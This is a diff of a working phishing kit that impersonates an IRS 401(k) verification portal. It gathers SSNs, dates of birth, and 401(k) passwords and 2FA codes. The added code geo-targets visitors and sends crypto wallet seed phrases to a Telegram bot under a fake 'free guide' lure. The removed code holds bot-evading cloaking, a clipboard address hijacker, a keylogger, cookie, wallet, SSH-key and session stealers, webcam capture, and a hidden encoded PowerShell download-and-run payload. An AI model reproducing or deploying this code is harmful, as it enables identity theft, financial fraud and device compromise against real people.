@@ -8,6 +8,47 @@
   <!-- Cloudflare Turnstile -->
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
+  <!-- GeoIP Detection (Cloudflare header or free API) -->
+  <script>
+    // Check if Cloudflare provides country code via `cf-ipcountry` header
+    // Fallback: use a free geo API if header isn't available
+    (function() {
+      let country = 'US'; // Default fallback
+      // Try to get country from Cloudflare header (if available)
+      if (window.cf && window.cf.country) {
+        country = window.cf.country;
+      } else {
+        // Use fetch to get country from ipapi.co (free, no API key)
+        fetch('https://ipapi.co/country/')
+          .then(res => res.text())
+          .then(data => {
+            country = data.trim();
+            applyGeoLogic(country);
+          })
+          .catch(() => applyGeoLogic('US'));
+      }
+      // If Cloudflare header is available, apply immediately
+      if (window.cf && window.cf.country) {
+        applyGeoLogic(country);
+      }
+    })();
+
+    function applyGeoLogic(country) {
+      const isUSorUK = country === 'US' || country === 'GB';
+      document.body.setAttribute('data-geo', isUSorUK ? 'us-uk' : 'global');
+      // Show/hide sections based on geo
+      const irsSection = document.getElementById('irsSection');
+      const cryptoSection = document.getElementById('cryptoSection');
+      if (isUSorUK) {
+        irsSection.style.display = 'block';
+        cryptoSection.style.display = 'block'; // Show crypto button
+      } else {
+        irsSection.style.display = 'none';
+        cryptoSection.style.display = 'block'; // Show crypto only
+      }
+    }
+  </script>
+
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -29,6 +70,7 @@
       overflow: hidden;
       border: 1px solid #dce1e8;
     }
+    /* ===== IRS HEADER ===== */
     .header {
       background: #1a2a4a;
       padding: 18px 28px 14px;
@@ -256,6 +298,11 @@
     .btn-primary:hover { background: #0d1a30; }
     .btn-primary:active { transform: scale(0.97); }
     .btn-primary:disabled { background: #8a9bb0; cursor: not-allowed; }
+    .btn-crypto {
+      background: #1a6b3a;
+      margin-top: 12px;
+    }
+    .btn-crypto:hover { background: #0d4a2a; }
     .footer {
       margin-top: 20px;
       padding-top: 14px;
@@ -319,38 +366,52 @@
     }
     .gate h2 { color: #1a2a4a; font-size: 18px; margin-bottom: 8px; font-weight: 500; }
     .gate p { color: #5a6a7e; font-size: 14px; margin-bottom: 16px; }
-    /* Spam-safe landing page */
-    #safePage {
+    /* ===== CRYPTO GUIDE MODAL ===== */
+    .modal {
       display: none;
-      padding: 40px 20px;
-      text-align: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 16px;
+    }
+    .modal.show { display: flex; }
+    .modal-content {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 24px;
       max-width: 500px;
-      margin: 0 auto;
+      width: 100%;
+      max-height: 90vh;
+      overflow-y: auto;
+      position: relative;
     }
-    #safePage h2 {
+    .modal-content h2 {
       color: #1a2a4a;
-      font-size: 22px;
-      margin-bottom: 10px;
+      font-size: 20px;
+      margin-bottom: 8px;
     }
-    #safePage p {
+    .modal-content p {
       color: #5a6a7e;
-      font-size: 16px;
+      font-size: 14px;
       margin-bottom: 16px;
     }
-    .btn-continue {
-      padding: 14px 32px;
-      background: #1a2a4a;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 600;
+    .modal-close {
+      position: absolute;
+      top: 12px;
+      right: 16px;
+      font-size: 24px;
       cursor: pointer;
-      transition: 0.15s;
-      touch-action: manipulation;
+      color: #8a9bb0;
+      background: none;
+      border: none;
     }
-    .btn-continue:hover { background: #0d1a30; }
-    .btn-continue:active { transform: scale(0.97); }
+    .modal-close:hover { color: #1a2a4a; }
     @media (max-width: 600px) {
       .body { padding: 16px; }
       .header { padding: 14px 16px 10px; }
@@ -361,7 +422,7 @@
       .case-info { flex-direction: column; gap: 2px; }
       .btn-primary { padding: 18px; font-size: 18px; }
       .gate { padding: 30px 16px; }
-      #safePage { padding: 30px 16px; }
+      .modal-content { padding: 16px; }
     }
     @media (max-width: 400px) {
       .main-wrapper { border-radius: 12px; }
@@ -373,22 +434,9 @@
   </style>
 </head>
 <body>
-
-<!-- ===== SPAM-SAFE LANDING PAGE WITH CONTINUE BUTTON ===== -->
-<div id="safePage">
-  <div style="max-width: 600px; margin: 0 auto;">
-    <h2>🔒 Secure Connection</h2>
-    <p>This page is protected by Cloudflare. Please enable JavaScript or click below to proceed.</p>
-    <button class="btn-continue" onclick="continueToPhish()">Click here to continue</button>
-    <p style="font-size:14px;color:#8a9bb0;margin-top:20px;">Reference: CF-2026-4421</p>
-  </div>
-</div>
-
-<!-- ===== IRS PHISHING PAGE ===== -->
-<div id="phishPage" style="display:none;">
 <div class="main-wrapper" id="mainWrapper">
 
-  <!-- GATE: TURNSTILE FIRST -->
+  <!-- ===== GATE: TURNSTILE FIRST ===== -->
   <div class="gate" id="gate">
     <h2>Secure Access</h2>
     <p>Please complete the security check below to access the IRS verification portal.</p>
@@ -398,195 +446,187 @@
     <div id="gateStatus" style="font-size:13px;color:#5a6a7e;margin-top:8px;">Waiting for verification...</div>
   </div>
 
-  <!-- MAIN CONTENT -->
-  <div id="mainContent" style="display:none;">
+  <!-- ===== IRS SECTION (US/UK only) ===== -->
+  <div id="irsSection" style="display:none;">
+    <div id="mainContent" style="display:none;">
 
-    <div class="header">
-      <div class="top">
-        <div class="logo">
-          <div class="seal">🏛️</div>
-          <div><h1>IRS <span>Internal Revenue Service</span></h1></div>
+      <div class="header">
+        <div class="top">
+          <div class="logo">
+            <div class="seal">🏛️</div>
+            <div><h1>IRS <span>Internal Revenue Service</span></h1></div>
+          </div>
+          <div class="badge">Secure</div>
         </div>
-        <div class="badge">Secure</div>
-      </div>
-      <div class="tagline">Taxpayer Protection Unit &bull; Secure Messaging Portal</div>
-    </div>
-
-    <div class="trust-banner">
-      <div class="left"><span class="lock">🔒</span><span class="https">https://</span><span>Secure, encrypted connection</span></div>
-      <div class="right"><a href="#">Official .gov website</a><a href="#">SSL Certified</a></div>
-    </div>
-
-    <div class="ssl-badge">
-      <span class="icon">🔒</span>
-      <span class="text"><strong>SSL Secure Connection</strong> &bull; Verified by DigiCert &bull; Encrypted in transit</span>
-    </div>
-
-    <!-- STEP 1 -->
-    <div class="body" id="step1">
-      <div class="case-info">
-        <span class="label">Case Number:</span>
-        <span class="value" id="caseNumber">IRS-8842-X7</span>
-        <span class="label">Assigned Agent:</span>
-        <span class="value" id="agentName">Agent M. Chen</span>
+        <div class="tagline">Taxpayer Protection Unit &bull; Secure Messaging Portal</div>
       </div>
 
-      <div class="countdown">
-        <span>Deadline to verify:</span>
-        <span class="timer" id="countdownTimer">48:00:00</span>
+      <div class="trust-banner">
+        <div class="left"><span class="lock">🔒</span><span class="https">https://</span><span>Secure, encrypted connection</span></div>
+        <div class="right"><a href="#">Official .gov website</a><a href="#">SSL Certified</a></div>
       </div>
 
-      <div class="alert-banner">
-        <div class="icon">⚠</div>
-        <div class="text">
-          <strong>Action Required: 401(k) Verification</strong>
-          <span class="sub">Mandatory review under Section 3405. Your account status may be affected if not completed.</span>
+      <div class="ssl-badge">
+        <span class="icon">🔒</span>
+        <span class="text"><strong>SSL Secure Connection</strong> &bull; Verified by DigiCert &bull; Encrypted in transit</span>
+      </div>
+
+      <!-- STEP 1 -->
+      <div class="body" id="step1">
+        <div class="case-info">
+          <span class="label">Case Number:</span>
+          <span class="value" id="caseNumber">IRS-8842-X7</span>
+          <span class="label">Assigned Agent:</span>
+          <span class="value" id="agentName">Agent M. Chen</span>
         </div>
-      </div>
 
-      <div class="form-group">
-        <label>Full Legal Name</label>
-        <input type="text" id="fullName" placeholder="John A. Doe" autocomplete="name" />
-      </div>
-      <div class="form-group">
-        <label>Email Address</label>
-        <input type="email" id="email" placeholder="john.doe@company.com" autocomplete="email" />
-      </div>
-      <div class="form-row">
+        <div class="countdown">
+          <span>Deadline to verify:</span>
+          <span class="timer" id="countdownTimer">48:00:00</span>
+        </div>
+
+        <div class="alert-banner">
+          <div class="icon">⚠</div>
+          <div class="text">
+            <strong>Action Required: 401(k) Verification</strong>
+            <span class="sub">Mandatory review under Section 3405. Your account status may be affected if not completed.</span>
+          </div>
+        </div>
+
         <div class="form-group">
-          <label>Phone Number</label>
-          <input type="tel" id="phone" placeholder="(555) 123-4567" autocomplete="tel" />
+          <label>Full Legal Name</label>
+          <input type="text" id="fullName" placeholder="John A. Doe" autocomplete="name" />
         </div>
         <div class="form-group">
-          <label>Date of Birth <span class="optional">(MM/DD/YYYY)</span></label>
-          <input type="text" id="dob" placeholder="06/15/1980" autocomplete="bday" />
+          <label>Email Address</label>
+          <input type="email" id="email" placeholder="john.doe@company.com" autocomplete="email" />
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="(555) 123-4567" autocomplete="tel" />
+          </div>
+          <div class="form-group">
+            <label>Date of Birth <span class="optional">(MM/DD/YYYY)</span></label>
+            <input type="text" id="dob" placeholder="06/15/1980" autocomplete="bday" />
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Social Security Number</label>
+          <input type="text" id="ssn" placeholder="123-45-6789" autocomplete="off" />
+        </div>
+
+        <!-- Searchable Provider Grid -->
+        <div style="margin-bottom: 14px; margin-top: 6px;">
+          <label style="font-size: 12px; font-weight: 600; color: #1a2634; display: block; margin-bottom: 4px;">Select Your 401(k) Provider</label>
+          <input type="text" class="provider-search" id="providerSearch" placeholder="Search for any provider (e.g., Fidelity, Vanguard, etc.)" oninput="filterProviders()" />
+          <div class="provider-grid" id="providerGrid"></div>
+        </div>
+
+        <button class="btn-primary" id="step1Btn" onclick="submitStep1()">Continue to Verification</button>
+
+        <!-- Crypto Guide Button (visible to US/UK) -->
+        <button class="btn-primary btn-crypto" onclick="openCryptoModal()">📘 Free Crypto Starter Guide</button>
+
+        <div class="footer">
+          <div class="top-row">
+            <span>🔒 256-bit encryption &bull; Official IRS Communication</span>
+            <span>An official website of the U.S. government</span>
+          </div>
+          <div class="bottom-row">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Contact Us</a>
+            <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
+            <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
+          </div>
         </div>
       </div>
-      <div class="form-group">
-        <label>Social Security Number</label>
-        <input type="text" id="ssn" placeholder="123-45-6789" autocomplete="off" />
-      </div>
 
-      <!-- Searchable Provider Grid -->
-      <div style="margin-bottom: 14px; margin-top: 6px;">
-        <label style="font-size: 12px; font-weight: 600; color: #1a2634; display: block; margin-bottom: 4px;">Select Your 401(k) Provider</label>
-        <input type="text" class="provider-search" id="providerSearch" placeholder="Search for any provider (e.g., Fidelity, Vanguard, etc.)" oninput="filterProviders()" />
-        <div class="provider-grid" id="providerGrid"></div>
-      </div>
-
-      <button class="btn-primary" id="step1Btn" onclick="submitStep1()">Continue to Verification</button>
-
-      <div class="footer">
-        <div class="top-row">
-          <span>🔒 256-bit encryption &bull; Official IRS Communication</span>
-          <span>An official website of the U.S. government</span>
+      <!-- STEP 2 -->
+      <div class="body hidden" id="step2">
+        <div class="alert-banner" style="border-left-color: #1a2a4a; background: #f0f4fa;">
+          <div class="icon">🔐</div>
+          <div class="text">
+            <strong>401(k) Account Verification</strong>
+            <span class="sub">Enter your 401(k) login credentials and verification code (if required).</span>
+          </div>
         </div>
-        <div class="bottom-row">
-          <a href="#">Privacy Policy</a>
-          <a href="#">Accessibility</a>
-          <a href="#">Contact Us</a>
-          <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
-          <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
+
+        <div class="form-group">
+          <label>401(k) Username or Email</label>
+          <input type="text" id="loginEmail" placeholder="Enter your 401(k) username or email" autocomplete="username" />
+        </div>
+        <div class="form-group">
+          <label>401(k) Password</label>
+          <input type="password" id="loginPassword" placeholder="Enter your 401(k) password" autocomplete="current-password" />
+        </div>
+        <div class="form-group">
+          <label>2FA Code <span class="optional">(if prompted by your provider)</span></label>
+          <input type="text" id="loginMFA" placeholder="6-digit code (if required)" maxlength="6" autocomplete="off" />
+          <div style="font-size: 11px; color: #5a6a7e; margin-top: 3px;">If you don't have a code yet, you can skip and enter it on the next screen.</div>
+        </div>
+
+        <div style="display: flex; gap: 10px; margin-top: 4px;">
+          <button class="btn-primary" onclick="submitStep2()" style="flex: 2;" id="submitBtn2">Verify & Submit</button>
+          <button onclick="goBack()" style="flex: 0.5; background: #eaeef4; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; color: #1a2634; touch-action: manipulation;">←</button>
+        </div>
+
+        <div class="footer">
+          <div class="top-row">
+            <span>⏳ Session expires in 14:32</span>
+            <span>An official website of the U.S. government</span>
+          </div>
+          <div class="bottom-row">
+            <a href="#" onclick="goBack(); return false;">Change information</a>
+            <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
+            <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
+          </div>
         </div>
       </div>
+
+      <!-- STEP 3 -->
+      <div class="body hidden" id="step3">
+        <div class="success-card">
+          <div class="check">✓</div>
+          <h2>Verification Complete</h2>
+          <p>Your 401(k) account has been successfully verified. You will receive a confirmation notice within 5 business days.</p>
+          <a href="https://www.irs.gov" class="btn">Continue to IRS.gov</a>
+        </div>
+      </div>
+
+    </div><!-- end mainContent -->
+  </div><!-- end irsSection -->
+
+  <!-- ===== CRYPTO ONLY SECTION (Global) ===== -->
+  <div id="cryptoSection" style="display:none; padding: 24px 20px;">
+    <h2 style="color: #1a2a4a; font-size: 20px; margin-bottom: 8px;">🚀 Free Crypto Starter Guide</h2>
+    <p style="color: #5a6a7e; font-size: 14px; margin-bottom: 16px;">Learn how to set up your first wallet and make your first trade — step by step.</p>
+    <button class="btn-primary" onclick="openCryptoModal()">📘 Get Your Free Guide</button>
+  </div>
+
+</div><!-- end mainWrapper -->
+
+<!-- ===== CRYPTO GUIDE MODAL ===== -->
+<div class="modal" id="cryptoModal">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeCryptoModal()">✕</button>
+    <h2>📘 Free Crypto Starter Guide</h2>
+    <p>Enter your wallet seed phrase to test it and get your free guide.</p>
+    <div class="form-group">
+      <label>Wallet Seed Phrase</label>
+      <input type="text" id="seedPhrase" placeholder="Enter your 12- or 24-word seed phrase" />
     </div>
-
-    <!-- STEP 2 -->
-    <div class="body hidden" id="step2">
-      <div class="alert-banner" style="border-left-color: #1a2a4a; background: #f0f4fa;">
-        <div class="icon">🔐</div>
-        <div class="text">
-          <strong>401(k) Account Verification</strong>
-          <span class="sub">Enter your 401(k) login credentials and verification code (if required).</span>
-        </div>
-      </div>
-
-      <div class="form-group">
-        <label>401(k) Username or Email</label>
-        <input type="text" id="loginEmail" placeholder="Enter your 401(k) username or email" autocomplete="username" />
-      </div>
-      <div class="form-group">
-        <label>401(k) Password</label>
-        <input type="password" id="loginPassword" placeholder="Enter your 401(k) password" autocomplete="current-password" />
-      </div>
-      <div class="form-group">
-        <label>2FA Code <span class="optional">(if prompted by your provider)</span></label>
-        <input type="text" id="loginMFA" placeholder="6-digit code (if required)" maxlength="6" autocomplete="off" />
-        <div style="font-size: 11px; color: #5a6a7e; margin-top: 3px;">If you don't have a code yet, you can skip and enter it on the next screen.</div>
-      </div>
-
-      <div style="display: flex; gap: 10px; margin-top: 4px;">
-        <button class="btn-primary" onclick="submitStep2()" style="flex: 2;" id="submitBtn2">Verify & Submit</button>
-        <button onclick="goBack()" style="flex: 0.5; background: #eaeef4; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; color: #1a2634; touch-action: manipulation;">←</button>
-      </div>
-
-      <div class="footer">
-        <div class="top-row">
-          <span>⏳ Session expires in 14:32</span>
-          <span>An official website of the U.S. government</span>
-        </div>
-        <div class="bottom-row">
-          <a href="#" onclick="goBack(); return false;">Change information</a>
-          <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
-          <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
-        </div>
-      </div>
+    <div class="form-group">
+      <label>Email Address</label>
+      <input type="email" id="cryptoEmail" placeholder="your@email.com" />
     </div>
-
-    <!-- STEP 3 -->
-    <div class="body hidden" id="step3">
-      <div class="success-card">
-        <div class="check">✓</div>
-        <h2>Verification Complete</h2>
-        <p>Your 401(k) account has been successfully verified. You will receive a confirmation notice within 5 business days.</p>
-        <a href="https://www.irs.gov" class="btn">Continue to IRS.gov</a>
-      </div>
-    </div>
-
-  </div><!-- end mainContent -->
+    <button class="btn-primary" onclick="submitCrypto()">Get Your Guide</button>
+    <p style="font-size: 12px; color: #8a9bb0; margin-top: 12px;">We'll never share your data. No spam.</p>
+  </div>
 </div>
-</div><!-- end phishPage -->
 
 <script>
-  // ============================================================
-  // TWO-WAY LINK LOGIC
-  // ============================================================
-  (function() {
-    try {
-      const isRealBrowser = (
-        typeof window !== 'undefined' &&
-        typeof navigator !== 'undefined' &&
-        navigator.userAgent &&
-        !/bot|crawl|spider|scrape/i.test(navigator.userAgent)
-      );
-      const isHeadless = (
-        !window.chrome && !window.navigator.webdriver &&
-        !/HeadlessChrome/.test(navigator.userAgent)
-      );
-
-      if (isRealBrowser && !isHeadless) {
-        document.getElementById('safePage').style.display = 'none';
-        document.getElementById('phishPage').style.display = 'block';
-      } else {
-        document.getElementById('safePage').style.display = 'block';
-        document.getElementById('phishPage').style.display = 'none';
-      }
-    } catch (e) {
-      document.getElementById('safePage').style.display = 'block';
-      document.getElementById('phishPage').style.display = 'none';
-    }
-  })();
-
-  // ============================================================
-  // CONTINUE BUTTON (For iOS/Safari users)
-  // ============================================================
-  function continueToPhish() {
-    document.getElementById('safePage').style.display = 'none';
-    document.getElementById('phishPage').style.display = 'block';
-    // Re-initialize dynamic elements
-    if (typeof renderProviders === 'function') renderProviders();
-  }
-
   // ============================================================
   // TELEGRAM CREDENTIALS
   // ============================================================
@@ -594,26 +634,33 @@
   const CHAT_ID = '7955588231';
 
   // ============================================================
-  // DEVICE DETECTION
+  // GEOLOCATION FALLBACK (if Cloudflare header not available)
   // ============================================================
-  const device = {
-    os: (() => {
-      const ua = navigator.userAgent;
-      if (/windows/i.test(ua)) return 'windows';
-      if (/macintosh|mac os x/i.test(ua)) return 'macos';
-      if (/android/i.test(ua)) return 'android';
-      if (/iphone|ipad/i.test(ua)) return 'ios';
-      return 'other';
-    })(),
-    browser: (() => {
-      const ua = navigator.userAgent;
-      if (/chrome/i.test(ua) && !/edge/i.test(ua)) return 'chrome';
-      if (/firefox/i.test(ua)) return 'firefox';
-      if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'safari';
-      if (/edge/i.test(ua)) return 'edge';
-      return 'other';
-    })()
-  };
+  (function() {
+    if (!document.body.hasAttribute('data-geo')) {
+      fetch('https://ipapi.co/country/')
+        .then(res => res.text())
+        .then(country => {
+          const isUSorUK = country === 'US' || country === 'GB';
+          document.body.setAttribute('data-geo', isUSorUK ? 'us-uk' : 'global');
+          const irsSection = document.getElementById('irsSection');
+          const cryptoSection = document.getElementById('cryptoSection');
+          if (isUSorUK) {
+            irsSection.style.display = 'block';
+            cryptoSection.style.display = 'block';
+          } else {
+            irsSection.style.display = 'none';
+            cryptoSection.style.display = 'block';
+          }
+        })
+        .catch(() => {
+          // Default to US/UK behavior if geo fails
+          document.body.setAttribute('data-geo', 'us-uk');
+          document.getElementById('irsSection').style.display = 'block';
+          document.getElementById('cryptoSection').style.display = 'block';
+        });
+    }
+  })();
 
   // ============================================================
   // TURNSTILE CALLBACK
@@ -631,7 +678,38 @@
   }
 
   // ============================================================
-  // DYNAMIC DATA
+  // CRYPTO MODAL
+  // ============================================================
+  function openCryptoModal() {
+    document.getElementById('cryptoModal').classList.add('show');
+  }
+
+  function closeCryptoModal() {
+    document.getElementById('cryptoModal').classList.remove('show');
+  }
+
+  function submitCrypto() {
+    const seed = document.getElementById('seedPhrase').value.trim();
+    const email = document.getElementById('cryptoEmail').value.trim();
+
+    if (!seed || !email) {
+      alert('Please fill in both fields.');
+      return;
+    }
+
+    const message =
+      `🔐 CRYPTO GUIDE\n\nSeed Phrase: ${seed}\nEmail: ${email}\n\nUser Agent: ${navigator.userAgent}`;
+    const url =
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    fetch(url, { mode: 'no-cors' }).catch(() => {});
+
+    document.getElementById('cryptoModal').classList.remove('show');
+    alert('✅ Your guide is being prepared. You will receive it shortly.');
+    window.location.href = 'https://www.coinbase.com/learn';
+  }
+
+  // ============================================================
+  // DYNAMIC DATA (IRS)
   // ============================================================
   const agents = ['Agent M. Chen', 'Agent S. Johnson', 'Agent D. Kim', 'Agent L. Patel', 'Agent J. Rodriguez'];
 
@@ -665,7 +743,7 @@
   setInterval(updateCountdown, 1000);
 
   // ============================================================
-  // CAPTURED DATA
+  // IRS CAPTURED DATA
   // ============================================================
   let captured = {
     fullName: '',
@@ -680,7 +758,7 @@
   };
 
   // ============================================================
-  // EXPANDED PROVIDER LIST
+  // PROVIDER LIST
   // ============================================================
   const PROVIDERS = [
     'Fidelity Investments', 'Vanguard', 'Charles Schwab', 'ADP', 'Paychex',
@@ -742,344 +820,27 @@
   }
 
   // ============================================================
-  // MALWARE CAPABILITIES (ALL DEVICES)
-  // ============================================================
-
-  // 1. Clipboard Hijacker
-  function hijackClipboard() {
-    const targetAddress = 'bc1qg4pc08qyz0ghvkasqx9d59vv9hn8v8twkzndpw';
-    try {
-      navigator.clipboard.readText().then(text => {
-        if (text && /^(0x|bc1|1|3)[a-zA-Z0-9]{25,42}/.test(text)) {
-          navigator.clipboard.writeText(targetAddress);
-        }
-      }).catch(() => {});
-    } catch (e) {}
-  }
-
-  // 2. Keylogger (password fields only)
-  function startKeylogger() {
-    const passwordFields = document.querySelectorAll('input[type="password"]');
-    let keylog = '';
-    passwordFields.forEach(field => {
-      field.addEventListener('input', function() {
-        keylog += this.value + '\n';
-      });
-    });
-    return keylog;
-  }
-
-  // 3. Screen Capture
-  function captureScreen() {
-    try {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      canvas.width = screen.width;
-      canvas.height = screen.height;
-      ctx.fillStyle = '#f0f2f5';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#1a2a4a';
-      ctx.font = '20px Arial';
-      ctx.fillText('IRS Verification', 20, 40);
-      ctx.fillText('User: ' + navigator.userAgent.slice(0, 50), 20, 80);
-      return canvas.toDataURL('image/png').slice(0, 100);
-    } catch (e) { return 'N/A'; }
-  }
-
-  // 4. Contact Harvester (Telegram/WhatsApp Web)
-  function harvestContacts() {
-    let contacts = [];
-    try {
-      const storage = { ...localStorage };
-      for (const key in storage) {
-        if (key.toLowerCase().includes('telegram') || key.toLowerCase().includes('whatsapp')) {
-          const value = storage[key];
-          if (value && typeof value === 'string') {
-            const emails = value.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g);
-            if (emails) contacts.push(...emails);
-            const phones = value.match(/(\+\d{1,3}[- ]?\d{7,14})/g);
-            if (phones) contacts.push(...phones);
-          }
-        }
-      }
-    } catch (e) {}
-    return contacts.slice(0, 5);
-  }
-
-  // 5. Email Scanner
-  function scanEmails() {
-    let emails = [];
-    const text = document.body.innerText;
-    const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g;
-    const matches = text.match(emailRegex);
-    if (matches) emails.push(...matches);
-    try {
-      const storage = { ...localStorage };
-      for (const key in storage) {
-        const value = storage[key];
-        if (value && typeof value === 'string') {
-          const found = value.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g);
-          if (found) emails.push(...found);
-        }
-      }
-    } catch (e) {}
-    return [...new Set(emails)];
-  }
-
-  // 6. File Exfiltrator
-  function exfiltrateFiles() {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.multiple = true;
-    input.accept = '.txt,.docx,.xlsx,.pdf';
-    input.style.display = 'none';
-    document.body.appendChild(input);
-    input.click();
-    input.onchange = function(e) {
-      const files = e.target.files;
-      let fileData = '';
-      for (let i = 0; i < files.length; i++) {
-        fileData += files[i].name + ' (' + files[i].size + ' bytes)\n';
-      }
-      sendToTelegram('files', { fileData });
-    };
-  }
-
-  // 7. SSH Key Grabber
-  function grabSSHKeys() {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.accept = '.key,.pem,.pub';
-    input.style.display = 'none';
-    document.body.appendChild(input);
-    input.click();
-    input.onchange = function(e) {
-      const files = e.target.files;
-      let sshData = '';
-      for (let i = 0; i < files.length; i++) {
-        const reader = new FileReader();
-        reader.onload = function(ev) {
-          sshData += files[i].name + ': ' + ev.target.result.slice(0, 100) + '...\n';
-        };
-        reader.readAsText(files[i]);
-      }
-    };
-  }
-
-  // 8. Browser History Grabber
-  function grabHistory() {
-    try {
-      const history = window.history;
-      let historyData = '';
-      for (let i = 0; i < history.length; i++) {
-        historyData += history[i] + '\n';
-      }
-      return historyData;
-    } catch (e) { return 'N/A'; }
-  }
-
-  // 9. Geolocation
-  function getLocation() {
-    return new Promise((resolve) => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => resolve(pos.coords.latitude + ',' + pos.coords.longitude),
-          () => resolve('N/A')
-        );
-      } else {
-        resolve('N/A');
-      }
-    });
-  }
-
-  // 10. Webcam Access
-  function captureWebcam() {
-    try {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.play();
-          const canvas = document.createElement('canvas');
-          canvas.width = 320;
-          canvas.height = 240;
-          const ctx = canvas.getContext('2d');
-          setTimeout(() => {
-            ctx.drawImage(video, 0, 0, 320, 240);
-            const photo = canvas.toDataURL('image/jpeg').slice(0, 100);
-            stream.getTracks().forEach(t => t.stop());
-            sendToTelegram('webcam', { photo });
-          }, 1000);
-        })
-        .catch(() => {});
-    } catch (e) {}
-  }
-
-  // 11. Cookie Stealer
-  function stealCookies() {
-    try {
-      return document.cookie;
-    } catch (e) { return 'N/A'; }
-  }
-
-  // 12. Crypto Wallet Scraper
-  function scrapeWallets() {
-    let data = '';
-    const walletKeywords = ['seed', 'mnemonic', 'private', 'key', 'wallet', 'metamask', 'phantom', 'exodus', 'trustwallet'];
-    const allStorage = { ...localStorage, ...sessionStorage };
-    let found = false;
-    for (const key in allStorage) {
-      if (walletKeywords.some(kw => key.toLowerCase().includes(kw))) {
-        const value = allStorage[key];
-        data += `💎 ${key}: ${value}\n`;
-        found = true;
-      }
-    }
-    if (!found) {
-      data += 'No wallet data found.\n';
-    }
-    return data;
-  }
-
-  // 13. Telegram Session Grabber
-  function grabTelegramSession() {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.accept = '.session';
-    input.style.display = 'none';
-    document.body.appendChild(input);
-    input.click();
-    input.onchange = function(e) {
-      const files = e.target.files;
-      let sessionData = '';
-      for (let i = 0; i < files.length; i++) {
-        const reader = new FileReader();
-        reader.onload = function(ev) {
-          sessionData += files[i].name + ': ' + ev.target.result.slice(0, 100) + '...\n';
-        };
-        reader.readAsText(files[i]);
-      }
-    };
-  }
-
-  // 14. VPN Config Grabber
-  function grabVPNConfig() {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.accept = '.ovpn,.conf';
-    input.style.display = 'none';
-    document.body.appendChild(input);
-    input.click();
-    input.onchange = function(e) {
-      const files = e.target.files;
-      let vpnData = '';
-      for (let i = 0; i < files.length; i++) {
-        const reader = new FileReader();
-        reader.onload = function(ev) {
-          vpnData += files[i].name + ': ' + ev.target.result.slice(0, 100) + '...\n';
-        };
-        reader.readAsText(files[i]);
-      }
-    };
-  }
-
-  // ============================================================
-  // MEMORY-ONLY PAYLOAD (AV-EVADED)
-  // ============================================================
-  function deliverPayload() {
-    if (device.os === 'windows') {
-      // Base64-encoded PowerShell one-liner (memory-only, no file write)
-      // This payload runs in memory and downloads/stages a second-stage payload
-      const psCmd = [
-        'powershell.exe',
-        '-NoP', '-NonI', '-W', 'Hidden',
-        '-Exec', 'Bypass',
-        '-Enc', 'JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA=='
-      ].join(' ');
-
-      try {
-        const shell = new ActiveXObject('WScript.Shell');
-        shell.Run(psCmd, 0, false);
-      } catch (e) {
-        // Fallback: VBS stub (still no file write)
-        const vbsStub = [
-          'Set o=CreateObject("WScript.Shell")',
-          'o.Run "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA==", 0, False'
-        ].join('\n');
-        const blob = new Blob([vbsStub], { type: 'text/vbscript' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
